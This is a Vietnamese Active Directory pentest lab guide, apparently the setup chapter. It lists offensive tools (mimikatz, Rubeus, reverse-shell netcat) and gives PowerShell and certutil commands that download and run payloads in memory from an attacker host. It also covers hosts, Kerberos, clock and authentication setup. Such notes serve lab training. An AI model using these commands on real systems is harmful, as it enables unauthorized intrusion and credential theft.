# 00 — Chuẩn bị công cụ & môi trường

Phần lớn lỗi "lệnh không chạy" trong AD đến từ **DNS, đồng hồ (clock skew) và tên
miền**, không phải từ kỹ thuật. Làm kỹ phần này trước mỗi lab.

## 1. Bộ công cụ cần có trên Kali

```bash
sudo apt update
sudo apt install -y netexec impacket-scripts bloodhound.py bloodhound \
  kerbrute enum4linux-ng smbmap ldap-utils responder evil-winrm \
  hashcat john seclists certipy-ad bloodyad ntpsec-ntpdate rdate \
  python3-ldapdomaindump ligolo-ng chisel proxychains4
# Nếu repo không có gói nào đó → dùng pipx:
pipx install git+https://github.com/Pennyw0rth/NetExec
pipx install bloodyAD
pipx install certipy-ad
pipx install git+https://github.com/dirkjanm/BloodHound.py@bloodhound-ce   # collector cho BloodHound CE
```

Tool Windows nên chuẩn bị sẵn trong 1 thư mục để `python3 -m http.server 80`:

| Tool | Dùng để | Nguồn |
|------|---------|-------|
| `SharpHound.exe` / `SharpHound.ps1` | Thu thập dữ liệu BloodHound từ máy Windows | BloodHound CE release |
| `PowerView.ps1` | Enum AD bằng PowerShell, ACL abuse | PowerSploit (dev branch) |
| `Rubeus.exe` | Kerberos: roast, asktgt, s4u, ptt, monitor | GhostPack (tự build hoặc SharpCollection) |
| `mimikatz.exe` (x64) | Dump credential, PtH, DCSync, ticket | gentilkiwi |
| `Certify.exe` | Enum/abuse ADCS từ Windows | GhostPack |
| `winPEASx64.exe`, `PrivescCheck.ps1` | Privesc local | PEASS-ng, itm4n |
| `GodPotato`, `PrintSpoofer64.exe`, `SweetPotato` | SeImpersonate → SYSTEM | GitHub |
| `RunasCs.exe` | Chạy lệnh với credential khác (khi không có RDP/WinRM) | antonioCoco |
| `nc64.exe` | Reverse shell | int0x33 |
| `agent.exe` (ligolo-ng), `chisel.exe` | Pivoting | GitHub releases |
| `SharpGPOAbuse.exe` | Lạm dụng quyền sửa GPO | FSecureLABS |
| `Invoke-Mimikatz.ps1`, `Invoke-PowerShellTcp.ps1` | Phương án dự phòng | nishang/PowerSploit |

Chuyển file sang Windows:

```powershell
PS> iwr http://$LHOST/SharpHound.exe -OutFile C:\Users\Public\sh.exe
PS> certutil -urlcache -split -f http://$LHOST/nc64.exe C:\Users\Public\nc.exe
PS> IEX (New-Object Net.WebClient).DownloadString('http://$LHOST/PowerView.ps1')   # nạp thẳng vào bộ nhớ
# Qua evil-winrm:  upload /path/file.exe   |   download C:\path\file
# Qua SMB:  impacket-smbserver share . -smb2support -username a -password a
PS> net use \\$LHOST\share /user:a a ; copy \\$LHOST\share\file.exe .
```

## 2. `/etc/hosts` — luôn làm đầu tiên

Kerberos **cần tên** (FQDN), không dùng IP. Lấy tên DC và domain:

```bash
nxc smb $DC
# SMB 10.10.10.100 445 DC01 [*] Windows Server 2019 ... (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)

# NetExec mới có thể tự tạo dòng hosts:
nxc smb $DC --generate-hosts-file /tmp/hosts && sudo tee -a /etc/hosts < /tmp/hosts
```

Hoặc thủ công:

```
10.10.10.100  DC01.corp.local  corp.local  DC01
```

> Thứ tự quan trọng: đặt FQDN của DC trước. Khi có nhiều máy, thêm từng máy vào.

## 3. `krb5.conf` — cần cho `evil-winrm -r`, `impacket -k`, `kinit`

```bash
nxc smb $DC --generate-krb5-file /tmp/krb5.conf   # NetExec ≥ 1.3
sudo cp /tmp/krb5.conf /etc/krb5.conf
```

Mẫu thủ công (realm **viết HOA**):

```ini
[libdefaults]
    default_realm = CORP.LOCAL
    dns_lookup_kdc = false
    dns_lookup_realm = false
[realms]
    CORP.LOCAL = {
        kdc = DC01.corp.local
        admin_server = DC01.corp.local
    }
[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local = CORP.LOCAL
```

## 4. Đồng bộ thời gian — lỗi `KRB_AP_ERR_SKEW (Clock skew too great)`

Kerberos chỉ chấp nhận lệch giờ ≤ 5 phút.

```bash
sudo timedatectl set-ntp off          # tắt NTP tự động của Kali (nếu không nó sẽ chỉnh lại)
sudo ntpdate -u $DC                   # hoặc:
sudo rdate -n $DC
# Không muốn đổi giờ hệ thống → dùng faketime cho từng lệnh:
faketime "$(date +'%Y-%m-%d %H:%M:%S' -d "$(curl -sI http://$DC 2>/dev/null | grep -i '^date:' | cut -d' ' -f2-)")" impacket-GetUserSPNs ...
```

## 5. Cú pháp xác thực cần thuộc lòng

| Tool | Password | NT hash | Kerberos ticket |
|------|----------|---------|-----------------|
| NetExec | `-u u -p 'p'` | `-u u -H HASH` | `--use-kcache` (với `KRB5CCNAME`) / `-k` |
| Impacket | `dom/u:'p'@host` | `dom/u@host -hashes :HASH` | `-k -no-pass dom/u@host_FQDN` |
| evil-winrm | `-u u -p 'p'` | `-u u -H HASH` | `-r CORP.LOCAL` (với `KRB5CCNAME`, `krb5.conf`) |
| bloodyAD | `-u u -p 'p'` | `-u u -p :HASH` | `-k` |
| certipy | `-u u@dom -p 'p'` | `-u u@dom -hashes :HASH` | `-k -no-pass` |
| smbclient | `-U 'dom/u%p'` | `--pw-nt-hash -U dom/u%HASH` | `--use-kerberos=required` |
| xfreerdp | `/u:u /p:'p' /d:dom` | `/pth:HASH` (cần Restricted Admin) | — |

Lưu ý:
- **NetExec**: thêm `--local-auth` khi dùng tài khoản local (Administrator local) thay vì domain.
- **Impacket**: dùng `-dc-ip $DC` khi DNS chưa trỏ đúng; dùng `-target-ip` khi tên ≠ IP.
- Mật khẩu có ký tự đặc biệt (`!`, `$`) → **luôn đặt trong nháy đơn** `'...'`.
- Ký hiệu `[+]` của NetExec = đúng; `(Pwn3d!)` = bạn là **local admin** trên máy đó.

## 6. Ý nghĩa các port thường gặp trên DC

| Port | Dịch vụ | Ý nghĩa với tấn công |
|------|---------|----------------------|
| 53 | DNS | Có DNS → gần như chắc là DC; zone transfer, ADIDNS |
| 88 | Kerberos | **Dấu hiệu chắc chắn của DC**; kerbrute, AS-REP, Kerberoast |
| 135/593 | MSRPC | rpcclient, WMI, DCOM |
| 139/445 | SMB | Share, null session, PsExec, relay (nếu signing tắt) |
| 389/636/3268/3269 | LDAP/LDAPS/Global Catalog | Enum, BloodHound, sửa ACL, RBCD |
| 464 | kpasswd | Đổi mật khẩu Kerberos |
| 5985/5986 | WinRM | `evil-winrm` (cần thuộc *Remote Management Users* hoặc admin) |
| 3389 | RDP | `xfreerdp` (cần *Remote Desktop Users*) |
| 1433 | MSSQL | `impacket-mssqlclient`, xp_cmdshell, xp_dirtree |
| 80/443 | IIS / ADCS Web Enrollment (`/certsrv`) | ESC8, web app → foothold |
| 9389 | AD Web Services | Dùng bởi module AD PowerShell / SOAPHound |
